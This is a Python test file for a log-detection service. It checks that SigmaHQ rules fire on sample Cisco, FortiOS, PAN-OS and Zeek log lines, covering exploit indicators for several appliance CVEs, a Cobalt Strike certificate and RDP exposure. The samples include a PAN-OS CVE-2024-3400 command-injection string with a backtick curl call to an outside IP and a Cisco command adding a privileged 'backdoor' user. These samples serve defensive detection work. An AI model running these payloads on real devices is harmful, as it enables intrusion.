"""Network-device and Zeek logs reach the high SigmaHQ rules written for them.

2026-10-20 severity audit, high tier: Cisco AAA command accounting (4 rules), Cisco
IOS XE CVE-2023-20198, FortiOS SSL-VPN CVE-2022-42475, PAN-OS GlobalProtect
CVE-2024-3400, Zeek rdp.log and x509.log had no row with their log sources. The
Cisco AAA rules' keywords are bare words ("username", "aaa"): they may only see
command-accounting lines, never any other text. Rule bodies are SigmaHQ's.
"""
import json
import os
import sys
import unittest

for _p in (os.path.dirname(os.path.abspath(__file__)),
           os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "modules/backend")):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import _optional_deps  # noqa: F401,E402
from services.fusion import external_logs as X, sigma_eval as S  # noqa: E402


def r(title, logsource, detection):
    return S.compile_rule({"title": title, "id": title, "level": "high", "logsource": logsource,
                           "detection": detection})


AAA = {"product": "cisco", "service": "aaa"}
RULES = [
    r("Cisco Local Accounts", AAA, {"keywords": ["username", "aaa"], "condition": "keywords"}),
    r("Cisco Disabling Logging", AAA, {"keywords": ["no logging", "no aaa new-model"], "condition": "keywords"}),
    r("Cisco IOS XE CVE-2023-20198", {"product": "cisco", "service": "syslog"},
      {"keyword_event": ["%WEBUI-6-INSTALL_OPERATION_INFO:", "%SYS-5-CONFIG_P:", "%SEC_LOGIN-5-WEBLOGIN_SUCCESS:"],
       "keyword_user": ["cisco_tac_admin", "cisco_support", "cisco_sys_manager"],
       "condition": "keyword_event and keyword_user"}),
    r("FortiOS CVE-2022-42475", {"product": "fortios", "service": "sslvpnd"},
      {"keywords": ["/data/lib/libips.bak", "/var/.sslvpnconfigbk"], "condition": "keywords"}),
    r("PAN-OS CVE-2024-3400", {"category": "appliance", "product": "paloalto", "service": "globalprotect"},
      {"keywords_generic": ["failed to unmarshal session(../", "failed to unmarshal session(./../"],
       "condition": "keywords_generic"}),
    r("Default Cobalt Strike Certificate", {"product": "zeek", "service": "x509"},
      {"selection": {"certificate.serial": "8BB00EE"}, "condition": "selection"}),
    r("Publicly Accessible RDP Service", {"product": "zeek", "service": "rdp"},
      {"selection": {"id.orig_h|cidr": ["10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]},
       "condition": "not selection"}),
]


def titles(text):
    _fmt, rows, left = X.read(text)
    rows = rows or [{"text": line} for line in left]
    return sorted({h["title"] for row in rows for h in S.evaluate(X.sigma_event(row), RULES)})


class CiscoCommandAccounting(unittest.TestCase):
    def test_ios_commands_an_admin_typed(self):
        self.assertEqual(["Cisco Local Accounts"], titles(
            "Oct 20 10:05:00 rtr1 1234: %PARSER-5-CFGLOG_LOGGEDCMD: User:admin  logged command:username "
            "backdoor privilege 15 secret x"))
        self.assertEqual(["Cisco Disabling Logging"], titles(
            "Oct 20 10:05:00 rtr1 1235: %PARSER-5-CFGLOG_LOGGEDCMD: User:admin  logged command:no logging console"))

    def test_asa_executed_commands(self):
        self.assertEqual(["Cisco Disabling Logging"], titles(
            "Oct 20 10:05:00 asa1 %ASA-5-111008: User 'admin' executed the 'no logging enable' command."))

    def test_an_ordinary_command_is_quiet(self):
        self.assertEqual([], titles(
            "Oct 20 10:05:00 rtr1 1236: %PARSER-5-CFGLOG_LOGGEDCMD: User:admin  logged command:interface Gi0/1"))

    def test_the_bare_keywords_never_see_other_text(self):
        for line in ("Oct 20 10:05:00 h sshd[1]: Invalid user username from 203.0.113.9 port 4242",
                     "Oct 20 10:05:00 asa1 %ASA-6-113004: AAA user authentication Successful : user = admin",
                     "Oct 20 10:05:00 h app: no logging configured for tenant aaa"):
            self.assertEqual([], titles(line), line)


class ApplianceExploitIndicators(unittest.TestCase):
    def test_ios_xe_backdoor_account(self):
        self.assertEqual(["Cisco IOS XE CVE-2023-20198"], titles(
            "Oct 20 10:05:00 rtr1 %SEC_LOGIN-5-WEBLOGIN_SUCCESS: Login Success [user: cisco_tac_admin] "
            "[Source: 203.0.113.9]"))
        self.assertEqual([], titles(
            "Oct 20 10:05:00 rtr1 %SEC_LOGIN-5-WEBLOGIN_SUCCESS: Login Success [user: netops] [Source: 10.0.0.9]"))

    def test_fortios_and_panos(self):
        self.assertEqual(["FortiOS CVE-2022-42475"], titles(
            "date=2026-10-20 time=10:05:00 devname=fw1 logdesc=\"File created\" file=/data/lib/libips.bak"))
        self.assertEqual(["PAN-OS CVE-2024-3400"], titles(
            "2026-10-20 10:05:00 {\"level\":\"error\",\"msg\":\"failed to unmarshal session(../../../../opt/"
            "panlogs/tmp/device_telemetry/minute/x`curl${IFS}198.51.100.7`) map , EOF\"}"))


class Zeek(unittest.TestCase):
    def test_cobalt_strike_default_certificate(self):
        row = {"ts": 1700000000.0, "id": "F1", "certificate.version": 3, "certificate.serial": "8BB00EE",
               "certificate.subject": "CN=Major Cobalt Strike", "certificate.issuer": "CN=Major Cobalt Strike"}
        self.assertEqual(["Default Cobalt Strike Certificate"], titles(json.dumps(row)))

    def test_rdp_from_the_internet(self):
        row = {"ts": 1700000000.0, "uid": "C1", "id.orig_h": "203.0.113.9", "id.orig_p": 50000,
               "id.resp_h": "10.0.0.5", "id.resp_p": 3389, "cookie": "admin", "result": "Success",
               "security_protocol": "HYBRID", "keyboard_layout": "English - United States"}
        self.assertEqual(["Publicly Accessible RDP Service"], titles(json.dumps(row)))
        self.assertEqual([], titles(json.dumps({**row, "id.orig_h": "10.0.0.7"})))


if __name__ == "__main__":
    unittest.main()
